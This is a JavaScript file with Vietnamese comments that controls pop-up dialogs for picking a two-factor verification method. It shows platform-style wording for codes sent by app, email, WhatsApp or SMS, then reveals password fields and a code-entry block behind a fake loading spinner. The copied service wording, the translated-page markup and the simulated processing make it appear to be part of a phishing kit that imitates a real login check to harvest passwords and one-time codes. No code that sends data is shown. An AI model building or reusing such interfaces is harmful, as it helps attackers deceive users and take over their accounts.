// Lấy các phần tử modal và lớp phủ
const openChoosemdButton = document.getElementById('morway'); // Nút mở choosemd
const closeChoosemdButton = document.querySelector('#choosemd .btn-close'); // Nút đóng choosemd
const modalChoosemd = document.getElementById('choosemd'); // Modal choosemd
const modalTwoFA = document.getElementById('twoFAmodal'); // Modal twoFA
const chooseVrBtn = document.getElementById('choosevr-btn'); // Nút choosevr-btn
const chooseVrSpinner = document.getElementById('choosevr-spinner'); // Spinner của choosevr-btn
let backdrop = document.querySelector('.modal-backdrop'); // Lớp phủ cho twoFAmodal
let backdrop2 = null; // Lớp phủ riêng cho choosemd

// Tạo lớp phủ nếu chưa có
function createBackdrop(id, className, zIndex) {
  let existingBackdrop = document.getElementById(id);
  if (!existingBackdrop) {
    const newBackdrop = document.createElement('div');
    newBackdrop.className = className;
    newBackdrop.id = id;
    newBackdrop.style.zIndex = zIndex;
    newBackdrop.style.display = 'block'; // Đảm bảo luôn ở trạng thái block
    document.body.appendChild(newBackdrop);
    return newBackdrop;
  }
  return existingBackdrop;
}

// Hiển thị modal choosemd và chuyển backdrop2 lên trên twoFAmodal
function showChoosemd() {
  // Tạo lớp phủ riêng cho choosemd nếu chưa có
  backdrop2 = createBackdrop('backdrop2', 'modal-backdrop2', '1045');
  backdrop2.style.zIndex = '1045';

  // Hiển thị modal choosemd
  modalChoosemd.style.display = 'block';
  modalChoosemd.style.zIndex = '1050';

  // Đảm bảo twoFAmodal vẫn hiển thị
  if (modalTwoFA) {
    modalTwoFA.style.display = 'block';
    modalTwoFA.style.zIndex = '1040';
  }
}

// Ẩn modal choosemd và chuyển backdrop2 xuống dưới twoFAmodal
function hideChoosemd() {
  modalChoosemd.style.display = 'none'; // Ẩn modal choosemd

  if (backdrop2) {
    backdrop2.style.zIndex = '1035'; // Chuyển backdrop2 xuống dưới twoFAmodal
    backdrop2.style.display = 'block'; // Giữ trạng thái block
  }

  // Giữ twoFAmodal hiển thị
  if (modalTwoFA) {
    modalTwoFA.style.display = 'block';
    modalTwoFA.style.zIndex = '1040';
  }
}

// Sự kiện nút mở modal choosemd
openChoosemdButton.addEventListener('click', showChoosemd);

// Sự kiện nút đóng modal choosemd
closeChoosemdButton.addEventListener('click', hideChoosemd);

chooseVrBtn.addEventListener('click', () => {
  // Ẩn modal choosemd
  hideChoosemd();

  // Ẩn tất cả các lớp phủ modal-backdrop
  document.querySelectorAll('.modal-backdrop').forEach((backdropElement) => {
    backdropElement.style.display = 'none';
  });

  // Hiển thị spinner và ẩn văn bản trong nút
  chooseVrSpinner.style.display = 'inline-block';
  chooseVrBtn.querySelector('.button-text').style.display = 'none'; // Ẩn văn bản
  chooseVrBtn.setAttribute('disabled', 'true');

  // Lấy tùy chọn đã chọn
  const radioOptions = document.querySelectorAll('input[name="auth-option"]');
  const selectedOption = Array.from(radioOptions).find(option => option.checked);

  if (selectedOption) {
    // Đặt đường dẫn ảnh mới cho id="changeanh" dựa trên tùy chọn
    const changeAnh = document.getElementById('changeanh').querySelector('img');
    const titlevery = document.querySelector('#titlevery > font > font > font');
    const getdevice = document.getElementById('getdevice');

    if (selectedOption.id === 'auth-app') {
      changeAnh.src = 'images/2fab.png';
      if (titlevery) {
        titlevery.textContent = 'Go to your authentication app';
      }
      if (getdevice) {
        getdevice.textContent = 'Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).';
      }
    } else if (selectedOption.id === 'auth-email') {
      changeAnh.src = 'images/smsmail.png';
      if (titlevery) {
        titlevery.textContent = 'Check your email';
      }
      if (getdevice) {
        getdevice.textContent = 'Enter the code we sent to your email.';
      }
    } else if (selectedOption.id === 'auth-whatsapp') {
      changeAnh.src = 'images/wa.png';
      if (titlevery) {
        titlevery.textContent = 'Check your WhatsApp messages';
      }
      if (getdevice) {
        getdevice.textContent = 'Enter the code we sent to your WhatsApp account.';
      }
    } else if (selectedOption.id === 'auth-sms') {
      changeAnh.src = 'images/smsmail.png';
      if (titlevery) {
        titlevery.textContent = 'Check SMS';
      }
      if (getdevice) {
        getdevice.textContent = 'Enter the code we sent to your phone.';
      }
    }

    // Thay đổi trạng thái hiển thị của các phần tử khác
    const send2fa = document.getElementById('send2fa');
    const passwordInputs = document.querySelectorAll('.password-input');
    const duyetThietBi = document.getElementById('duyetthietbi');

    send2fa.style.display = 'block'; // Hiển thị send2fa
    passwordInputs.forEach(input => {
      input.style.display = 'block'; // Hiển thị tất cả password-input
    });
    if (duyetThietBi) {
      duyetThietBi.style.display = 'none'; // Ẩn duyetthietbi
    }
  }

  // Mô phỏng xử lý async (2 giây)
  setTimeout(() => {
    chooseVrSpinner.style.display = 'none'; // Ẩn spinner
    chooseVrBtn.querySelector('.button-text').style.display = 'inline'; // Hiển thị lại văn bản
    chooseVrBtn.removeAttribute('disabled'); // Kích hoạt lại nút
  }, 500);
});

// Ẩn modal choosemd khi nhấn vào lớp phủ của nó (nhưng không ảnh hưởng đến twoFAmodal)
document.addEventListener('click', (event) => {
  if (backdrop2 && event.target === backdrop2) {
    hideChoosemd();
  }
});
